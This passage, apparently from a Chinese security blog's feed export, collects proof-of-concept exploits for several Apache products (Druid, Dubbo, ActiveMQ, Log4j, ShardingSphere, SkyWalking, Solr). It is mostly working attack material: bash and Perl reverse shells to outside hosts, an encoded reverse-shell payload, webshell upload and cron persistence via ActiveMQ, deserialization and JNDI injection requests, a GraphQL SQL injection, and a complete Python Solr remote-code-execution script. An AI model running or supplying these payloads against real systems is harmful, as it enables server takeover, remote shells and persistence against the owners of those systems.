&quot;function&quot;: &quot;function(value) &#123;java.lang.Runtime.getRuntime().exec(&#39;&#x2F;bin&#x2F;bash -c $@|bash 0 echo bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&#39;)&#125;&quot;, &quot;&quot;: &#123;&quot;enabled&quot;: true&#125;&#125;&#125;&#125;, &quot;type&quot;: &quot;index&quot;, &quot;tuningConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;&#125;&#125;, &quot;samplerConfig&quot;: &#123;&quot;numRows&quot;: 500, &quot;timeoutMs&quot;: 15000&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>一键反弹工具：apacheDurid RCE_圈子版.jar</p>
]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>Apache-Druid</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache-Dubbo</title>
    <url>/2021/04/13/Apache-Dubbo/</url>
    <content><![CDATA[<p>x<em>Apache</em> <em>Dubbo</em> 是一款高性能Java RPC框架<a id="more"></a></p>
<h1 id="CVE-2019-17564-RCE"><a href="#CVE-2019-17564-RCE" class="headerlink" title="CVE-2019-17564-RCE"></a>CVE-2019-17564-RCE</h1><p>RCE漏洞，不是很好利用，需要找接口。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">影响版本：</span><br><span class="line"></span><br><span class="line">2.7.0 &lt;&#x3D; Apache Dubbo &lt;&#x3D; 2.7.4</span><br><span class="line"></span><br><span class="line">2.6.0 &lt;&#x3D; Apache Dubbo &lt;&#x3D; 2.6.7</span><br><span class="line"></span><br><span class="line">Apache Dubbo &#x3D; 2.5.x</span><br><span class="line"></span><br><span class="line">测试</span><br><span class="line">POST &#x2F;org.apache.dubbo.samples.http.api.DemoService HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line"></span><br><span class="line">paylaod</span><br><span class="line"></span><br><span class="line">java -jar ysoserial-master-55f1e7c35c-1.jar CommonsCollections4 &#x2F;System&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator &gt; 1.dat</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3、mvn构建，启动dubbo</span><br><span class="line"></span><br><span class="line">mvn clean package</span><br><span class="line">mvn -Djava.net.preferIPv4Stack&#x3D;true -Dexec.mainClass&#x3D;org.apache.dubbo.samples.http.HttpProvider exec:java</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用帮助</span><br><span class="line">usage: java -jar exp.jar [OPTION]</span><br><span class="line"></span><br><span class="line">-h --help 帮助信息</span><br><span class="line">-l --list 输出所有gadget信息</span><br><span class="line">-g --gadget gadget名称</span><br><span class="line">-a --args gadget入参，多个参数使用多次该命令传入，例-a http:&#x2F;&#x2F;127.0.0.1:80&#x2F; -a Calc</span><br><span class="line">-p --protocol [dubbo|http] 通讯协议名称，默认缺省dubbo</span><br><span class="line">-s --serialization [hessian|java] 序列化类型，默认缺省hessian</span><br><span class="line">-t --target 目标，例：127.0.0.1:20880</span><br><span class="line">-f --fastcheck 快速攻击检查（使用预置参数数据文件，遍历所有gadget进行攻击检查），参数为数据文件路径，参考文件check.data</span><br><span class="line">例（快速攻击检测，若不指定序列化类型，则全部gadget都会尝试）：</span><br><span class="line"></span><br><span class="line">java -jar dubbo-exp.jar</span><br><span class="line">--target 127.0.0.1:20881 </span><br><span class="line">--fastcheck &#x2F;Users&#x2F;threedr3am&#x2F;dubbo-exp&#x2F;check.data</span><br><span class="line"></span><br><span class="line">java -jar dubbo-exp-1.0-SNAPSHOT-jar-with-dependencies.jar --target 45.76.101.198:8080&#x2F;org.apache.dubbo.samples.http.api.DemoService --fastcheck check.data --protocol http -s java</span><br></pre></td></tr></table></figure>
<p>工具：dubbo-exp-1.0-SNAPSHOT-jar-with-dependencies.jar</p>
<h1 id="CVE-2020-1948-RCE"><a href="#CVE-2020-1948-RCE" class="headerlink" title="CVE-2020-1948-RCE"></a>CVE-2020-1948-RCE</h1><p>JDNI注入</p>
<p>工具：cve-2020-1948.py</p>
]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>Apache-Dubbo</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache-Mesos</title>
    <url>/2021/04/13/Apache-Mesos/</url>
    <content><![CDATA[<p><em>Apache Mesos</em>是由加州大学伯克利分校的AMPLab首先开发的一款开源群集管理软件，支持Hadoop、ElasticSearch、Spark、Storm 和Kafka等应用架构。<a id="more"></a></p>
<h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;IP:5050&#x2F;master&#x2F;state.json</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>Apache-Mesos</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache-MQ</title>
    <url>/2021/04/13/Apache-MQ/</url>
    <content><![CDATA[<p><em>Apache</em> Active<em>MQ</em>是<em>Apache</em>软件基金会所研发的开放源代码消息中间件<a id="more"></a></p>
<h1 id="CVE-2015-5254-RCE"><a href="#CVE-2015-5254-RCE" class="headerlink" title="CVE-2015-5254-RCE"></a>CVE-2015-5254-RCE</h1><p>反序列化RCE</p>
<p>5.x before the 5.13.0</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;success&quot; -Yp ROME your-ip 61616</span><br><span class="line"></span><br><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xOTQuNi4yMDUvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 10.194.7.7 61616</span><br><span class="line"></span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xOTQuNi4yMDUvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>工具：jmet-0.1.0-all.jar</p>
<h1 id="CVE-2016-3088-文件上传"><a href="#CVE-2016-3088-文件上传" class="headerlink" title="CVE-2016-3088-文件上传"></a>CVE-2016-3088-文件上传</h1><p>1.获取activemq home</p>
<p>2.put一个文件</p>
<p>3.move文件到activemq home路径下的webapps</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;admin&#x2F;test&#x2F;systemProperties.jsp</span><br><span class="line">activemq_home </span><br><span class="line">后加webapps</span><br><span class="line"></span><br><span class="line">PUT &#x2F;fileserver&#x2F;2.txt HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 120976</span><br><span class="line"></span><br><span class="line">webshell...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MOVE &#x2F;fileserver&#x2F;2.txt HTTP&#x2F;1.1</span><br><span class="line">Destination: file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;s.jsp</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">定时任务</span><br><span class="line"></span><br><span class="line">PUT &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 248</span><br><span class="line"></span><br><span class="line">*&#x2F;1 * * * * root &#x2F;usr&#x2F;bin&#x2F;perl -e &#39;use Socket;$i&#x3D;&quot;10.0.0.1&quot;;$p&#x3D;21;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MOVE &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Destination: file:&#x2F;&#x2F;&#x2F;etc&#x2F;cron.d&#x2F;root</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>Apache-MQ</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache-Log4j</title>
    <url>/2021/04/13/Apache-Log4j/</url>
    <content><![CDATA[<p><em>Log4j</em>是<em>Apache</em>的一个开源项目，通过使用<em>Log4j</em>，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等<a id="more"></a></p>
<h1 id="CVE-2017-5645-RCE"><a href="#CVE-2017-5645-RCE" class="headerlink" title="CVE-2017-5645-RCE"></a>CVE-2017-5645-RCE</h1><p>影响Log4j2.x&lt;=2.8.1</p>
<p>使用<br>java -jar ysoxxx.jar CommonsCollections1 calc &gt; 123.b<br>cat 123.b | nc x.x.x.x 1234</p>
<h1 id="CVE-2019-17571"><a href="#CVE-2019-17571" class="headerlink" title="CVE-2019-17571"></a>CVE-2019-17571</h1><p>影响<br>Log4j1.2.x&lt;=1.2.17</p>
<p>使用<br>java -jar ysoxxx.jar CommonsCollections1 calc &gt; 123.b<br>cat 123.b | nc x.x.x.x 1234</p>
]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>Apache-Log4j</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache-ShardingSphere</title>
    <url>/2021/04/13/Apache-ShardingSphere/</url>
    <content><![CDATA[<p><em>Sharding-Sphere</em>是一套开源的分布式数据库中间件解决方案组成的生态圈，它由Sharding-JDBC、Sharding-Proxy和Sharding-Sidecar（计划中）这3款相互独立的产品组成。<a id="more"></a></p>
<h1 id="CVE-2020-1947-后台RCE"><a href="#CVE-2020-1947-后台RCE" class="headerlink" title="CVE-2020-1947-后台RCE"></a>CVE-2020-1947-后台RCE</h1><p>默认用户名和密码是: admin/admin</p>
<p>JNDI注入</p>
<p><img src="./images/CVE-2020-1947.gif" alt="CVE-2020-1947"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;api&#x2F;schema HTTP&#x2F;1.1</span><br><span class="line">Host: 10.10.20.166:8088</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko&#x2F;20100101 Firefox&#x2F;55.0</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;json;charset&#x3D;utf-8</span><br><span class="line">Access-Token: XXXX</span><br><span class="line">Referer: http:&#x2F;&#x2F;10.10.20.166:8088&#x2F;</span><br><span class="line">Content-Length: 595</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;CVE-2020-1947&quot;,</span><br><span class="line">  &quot;ruleConfiguration&quot;: &quot;  encryptors:\n    encryptor_aes:\n      type: aes\n      props:\n        aes.key.value: 123456abc\n    encryptor_md5:\n      type: md5\n  tables:\n    t_encrypt:\n      columns:\n        user_id:\n          plainColumn: user_plain\n          cipherColumn: user_cipher\n          encryptor: encryptor_aes\n        order_id:\n          cipherColumn: order_cipher\n          encryptor: encryptor_md5&quot;,</span><br><span class="line">  &quot;dataSourceConfiguration&quot;: &quot;!!com.sun.rowset.JdbcRowSetImpl\n  dataSourceName: ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;ExportObject\n  autoCommit: true&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>Apache-ShardingSphere</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache-SkyWalking</title>
    <url>/2021/04/13/Apache-SkyWalking/</url>
    <content><![CDATA[<p>SkyWalking 是一款开源的应用性能监控系统，包括指标监控，分布式追踪，分布式系统性能诊断。<a id="more"></a></p>
<p>长这样</p>
<p><img src="./images/skywalking-show.jpg" alt="skywalking-show"></p>
<h1 id="cve-2020-9483-SQL注入"><a href="#cve-2020-9483-SQL注入" class="headerlink" title="cve-2020-9483-SQL注入"></a>cve-2020-9483-SQL注入</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;graphql</span><br><span class="line">&#123;&quot;query&quot;:&quot;query SQLi($d: Duration!)&#123;globalP99:getLinearIntValues(metric: &#123;name:\&quot;all_p99\&quot;,id:\&quot;&#39;) UNION SELECT 1,CONCAT(&#39;~&#39;,&#39;&#123;&#123;r1&#125;&#125;&#39;,&#39;~&#39;)-- \&quot;,&#125;, duration: $d)&#123;values&#123;value&#125;&#125;&#125;&quot;,&quot;variables&quot;:&#123;&quot;d&quot;:&#123;&quot;start&quot;:&quot;2021-11-11&quot;,&quot;end&quot;:&quot;2021-11-12&quot;,&quot;step&quot;:&quot;DAY&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-13921-SQL注入-待补充"><a href="#CVE-2020-13921-SQL注入-待补充" class="headerlink" title="CVE-2020-13921-SQL注入[待补充]"></a>CVE-2020-13921-SQL注入[待补充]</h1>]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>Apache-SkyWalking</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache-Solr</title>
    <url>/2021/04/13/Apache-Solr/</url>
    <content><![CDATA[<p>solr是基于<a href="http://lucene.apache.org/">lucene</a>的一个搜索服务器，lucene也是Apache的一个开源项目。<a id="more"></a></p>
<p>configSet方法建立core：<br>/solr/admin/cores?_=1565751818092&amp;action=CREATE&amp;instanceDir=new_core&amp;name=solr777&amp;wt=json&amp;configSet=_default</p>
<h1 id="CVE-2017-12629-RCE"><a href="#CVE-2017-12629-RCE" class="headerlink" title="CVE-2017-12629-RCE"></a>CVE-2017-12629-RCE</h1><p>Apache Solr 5.5.0到7.0.1版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line"># author:zhzyker</span><br><span class="line"># from:https:&#x2F;&#x2F;github.com&#x2F;zhzyker&#x2F;exphub</span><br><span class="line"># telegram:t.me&#x2F;zhzyker</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!&#x3D;4:</span><br><span class="line">    print(&#39;+--------------------------------------------------------------------------+&#39;)</span><br><span class="line">    print(&#39;+ DES: by zhzyker as https:&#x2F;&#x2F;github.com&#x2F;zhzyker&#x2F;exphub                     +&#39;)</span><br><span class="line">    print(&#39;+      Apache Solr Commons Remote Code Execution                           +&#39;)</span><br><span class="line">    print(&#39;+--------------------------------------------------------------------------+&#39;)</span><br><span class="line">    print(&#39;+ USE: python3 cve-2017-12629_cmd.py &lt;url&gt; &lt;listener_name&gt; &lt;cmd&gt;           +&#39;)</span><br><span class="line">    print(&#39;+ EXP: python3 cve-2017-12629_cmd.py http:&#x2F;&#x2F;ip:8983 name &quot;touch &#x2F;tmp&#x2F;123&quot;  +&#39;)</span><br><span class="line">    print(&#39;+ VER: Apache Solr &lt; 7.1.0                                                 +&#39;)</span><br><span class="line">    print(&#39;+--------------------------------------------------------------------------+&#39;)</span><br><span class="line">    sys.exit(0)</span><br><span class="line"></span><br><span class="line">url &#x3D; sys.argv[1]</span><br><span class="line">listener &#x3D; sys.argv[2]</span><br><span class="line">cmd &#x3D; sys.argv[3]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#get core name</span><br><span class="line">core_url &#x3D; url + &quot;&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json&quot;</span><br><span class="line">try:</span><br><span class="line">    r &#x3D; requests.request(&quot;GET&quot;, url&#x3D;core_url, timeout&#x3D;20)</span><br><span class="line">    core_name &#x3D; list(json.loads(r.text)[&quot;status&quot;])[0]</span><br><span class="line">    print (&quot;[+] GET CORE NAME: &quot;+url+&quot;&#x2F;solr&#x2F;&quot;+core_name+&quot;&#x2F;config&quot;)</span><br><span class="line">except:</span><br><span class="line">    print (&quot;[-] Target Not Vuln Good Luck&quot;)</span><br><span class="line">    sys.exit(0)</span><br><span class="line">    </span><br><span class="line">cmd_url &#x3D; url + &quot;&#x2F;solr&#x2F;&quot; +core_name+ &quot;&#x2F;config&quot;</span><br><span class="line">exec_url &#x3D; url + &quot;&#x2F;solr&#x2F;&quot; +core_name+ &quot;&#x2F;update&quot;</span><br><span class="line">#print (cmd_url)</span><br><span class="line">#print (exec_url)</span><br><span class="line">    </span><br><span class="line">headers_cmd &#x3D; &#123;</span><br><span class="line">    &#39;Host&#39;: &quot;localhost&quot;,</span><br><span class="line">    &#39;Accept&#39;: &quot;*&#x2F;*&quot;,</span><br><span class="line">    &#39;Accept-Language&#39;: &quot;en&quot;,</span><br><span class="line">    &#39;User-Agent&#39;: &quot;Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)&quot;,</span><br><span class="line">    &#39;Connection&#39;: &quot;close&quot;,</span><br><span class="line">    &#39;Content-Length&#39;: &quot;160&quot;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">headers_exec &#x3D; &#123;</span><br><span class="line">    &#39;Host&#39;: &quot;localhost&quot;,</span><br><span class="line">    &#39;ccept-Language&#39;: &quot;en&quot;,</span><br><span class="line">    &#39;User-Agent&#39;: &quot;Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)&quot;,</span><br><span class="line">    &#39;Connection&#39;: &quot;close&quot;,</span><br><span class="line">    &#39;Content-Type&#39;: &quot;application&#x2F;json&quot;,</span><br><span class="line">    &#39;Content-Length&#39;: &quot;15&quot;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload_cmd &#x3D; &quot;&quot;&quot;</span><br><span class="line">&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;%s&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;&#x2F;bin&#x2F;&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;%s&quot;]&#125;&#125;</span><br><span class="line">&quot;&quot;&quot; % (listener,cmd)</span><br><span class="line"></span><br><span class="line">payload_exec &#x3D; &quot;&quot;&quot;</span><br><span class="line">[&#123;&quot;id&quot;:&quot;test&quot;&#125;]</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">r &#x3D; requests.request(&quot;POST&quot;, url&#x3D;cmd_url, data&#x3D;payload_cmd, headers&#x3D;headers_cmd, timeout&#x3D;30)</span><br><span class="line">a &#x3D; list(json.loads(r.text))[1]</span><br><span class="line">if &quot;errorMessages&quot; in a:</span><br><span class="line">    print (&quot;[-] Listener Repeat&quot;)</span><br><span class="line">    sys.exit(0)</span><br><span class="line"></span><br><span class="line">r &#x3D; requests.request(&quot;POST&quot;, url&#x3D;exec_url, data&#x3D;payload_exec, headers&#x3D;headers_exec, timeout&#x3D;30)</span><br><span class="line">if r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">    print (&quot;[+] Command Executed Successfully (Effective about one minute) (No Echo)&quot;)</span><br><span class="line">else:</span><br><span class="line">    print (&quot;[-] Command Executed Failed&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>工具：cve-2017-12629_cmd.py</p>
<h1 id="CVE-2019-0192-RCE"><a href="#CVE-2019-0192-RCE" class="headerlink" title="CVE-2019-0192-RCE"></a>CVE-2019-0192-RCE</h1><p>Apache Solr 5.0.0-5.5.5 版本</p>
<p>Apache Solr 6.0.0-6.6.5 版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 &quot;touch &#x2F;tmp&#x2F;pwn.txt&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">solr&#x2F;[corename]&#x2F;config</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;set-property&quot;: &#123;&quot;jmx.serviceUrl&quot;: &quot;service:jmx:rmi:&#x2F;&#x2F;&#x2F;jndi&#x2F;rmi:&#x2F;&#x2F;1.1.1.1:1099&#x2F;obj&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">受影响的版本包括Solr 5.0.0到5.5.5和6.0.0到6.6.5。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl -i -s -k  -X $&#39;POST&#39; \</span><br><span class="line">    -H $&#39;Host: 172.17.0.2:8983&#39; \</span><br><span class="line">    -H $&#39;Content-Type: application&#x2F;json&#39; \</span><br><span class="line">    --data-binary $&#39;&#123;\&quot;set-property\&quot;:&#123;\&quot;jmx.serviceUrl\&quot;:\&quot;service:jmx:rmi:&#x2F;&#x2F;&#x2F;jndi&#x2F;rmi:&#x2F;&#x2F;172.17.0.1:1099&#x2F;obj\&quot;&#125;&#125;&#39; \</span><br><span class="line">    $&#39;http:&#x2F;&#x2F;172.17.0.2:8983&#x2F;solr&#x2F;ckan&#x2F;config&#x2F;jmx&#39;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-0193-RCE"><a href="#CVE-2019-0193-RCE" class="headerlink" title="CVE-2019-0193-RCE"></a>CVE-2019-0193-RCE</h1><p>Apache Solr &lt; 8.2.0 并且开启了DataImportHandler模块</p>
<p>无回显POC</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;solr&#x2F;tika&#x2F;dataimport HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8983</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;solr.com:8983&#x2F;solr&#x2F;</span><br><span class="line">Content-type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 997</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">command&#x3D;full-import&amp;verbose&#x3D;false&amp;clean&#x3D;false&amp;commit&#x3D;false&amp;debug&#x3D;true&amp;core&#x3D;tika&amp;name&#x3D;dataimport&amp;dataConfig&#x3D;</span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type&#x3D;&quot;URLDataSource&quot;&#x2F;&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">          function poc()&#123;</span><br><span class="line">java.lang.Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">&#125;</span><br><span class="line">  ]]&gt;&lt;&#x2F;script&gt;</span><br><span class="line">        &lt;document&gt;</span><br><span class="line">                &lt;entity name&#x3D;&quot;slashdot&quot;</span><br><span class="line">                        pk&#x3D;&quot;link&quot;</span><br><span class="line">                        url&#x3D;&quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;1135&#x2F;solr_exploit&#x2F;master&#x2F;URLDataSource&#x2F;demo.xml&quot;</span><br><span class="line">                        processor&#x3D;&quot;XPathEntityProcessor&quot;</span><br><span class="line">                        forEach&#x3D;&quot;&#x2F;RDF&#x2F;channel | &#x2F;RDF&#x2F;item&quot;</span><br><span class="line">                        transformer&#x3D;&quot;script:poc&quot;&gt;</span><br><span class="line">                        &lt;field column&#x3D;&quot;subject&quot;      xpath&#x3D;&quot;&#x2F;RDF&#x2F;channel&#x2F;subject&quot; commonField&#x3D;&quot;true&quot; &#x2F;&gt;</span><br><span class="line">                        &lt;field column&#x3D;&quot;title&quot;        xpath&#x3D;&quot;&#x2F;RDF&#x2F;item&#x2F;title&quot; &#x2F;&gt;</span><br><span class="line">                        &lt;field column&#x3D;&quot;link&quot;         xpath&#x3D;&quot;&#x2F;RDF&#x2F;item&#x2F;link&quot; &#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;entity&gt;</span><br><span class="line">        &lt;&#x2F;document&gt;</span><br><span class="line">&lt;&#x2F;dataConfig&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type&#x3D;&quot;URLDataSource&quot;&#x2F;&gt;</span><br><span class="line">     &lt;script&gt;&lt;![CDATA[</span><br><span class="line">        function f1(row)&#123;</span><br><span class="line">        java.lang.Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        return row;</span><br><span class="line">        &#125;</span><br><span class="line">    ]]&gt;&lt;&#x2F;script&gt;</span><br><span class="line">  &lt;document&gt;</span><br><span class="line">    &lt;entity name&#x3D;&quot;stackoverflow&quot;</span><br><span class="line">            url&#x3D;&quot;https:&#x2F;&#x2F;stackoverflow.com&#x2F;feeds&#x2F;tag&#x2F;solr&quot;</span><br><span class="line">            processor&#x3D;&quot;XPathEntityProcessor&quot;</span><br><span class="line">            forEach&#x3D;&quot;&#x2F;feed|&#x2F;feed&#x2F;entry&quot;</span><br><span class="line">            transformer&#x3D;&quot;script:f1&quot;&gt;</span><br><span class="line">    &lt;&#x2F;entity&gt;</span><br><span class="line">  &lt;&#x2F;document&gt;</span><br><span class="line">&lt;&#x2F;dataConfig&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>有回显POC</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">command&#x3D;full-import&amp;verbose&#x3D;false&amp;clean&#x3D;false&amp;commit&#x3D;false&amp;debug&#x3D;true&amp;core&#x3D;tika&amp;name&#x3D;dataimport&amp;dataConfig&#x3D;</span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type&#x3D;&quot;URLDataSource&quot;&#x2F;&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">          function poc(row)&#123;</span><br><span class="line"> var bufReader &#x3D; new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(&quot;cmd &#x2F;c whoami&quot;).getInputStream()));</span><br><span class="line">var result &#x3D; [];</span><br><span class="line">while(true) &#123;</span><br><span class="line">var oneline &#x3D; bufReader.readLine();</span><br><span class="line">result.push( oneline );</span><br><span class="line">if(!oneline) break;</span><br><span class="line">&#125;</span><br><span class="line">row.put(&quot;title&quot;,result.join(&quot;\n\r&quot;));</span><br><span class="line">return row;</span><br><span class="line">&#125;</span><br><span class="line">  ]]&gt;&lt;&#x2F;script&gt;</span><br><span class="line">        &lt;document&gt;</span><br><span class="line">                &lt;entity name&#x3D;&quot;slashdot&quot;</span><br><span class="line">                        pk&#x3D;&quot;link&quot;                      url&#x3D;&quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;1135&#x2F;solr_exploit&#x2F;master&#x2F;URLDataSource&#x2F;demo.xml&quot;</span><br><span class="line">                        processor&#x3D;&quot;XPathEntityProcessor&quot;</span><br><span class="line">                        forEach&#x3D;&quot;&#x2F;RDF&#x2F;channel | &#x2F;RDF&#x2F;item&quot;</span><br><span class="line">                        transformer&#x3D;&quot;script:poc&quot;&gt;</span><br><span class="line">                        &lt;field column&#x3D;&quot;subject&quot;      xpath&#x3D;&quot;&#x2F;RDF&#x2F;channel&#x2F;subject&quot; commonField&#x3D;&quot;true&quot; 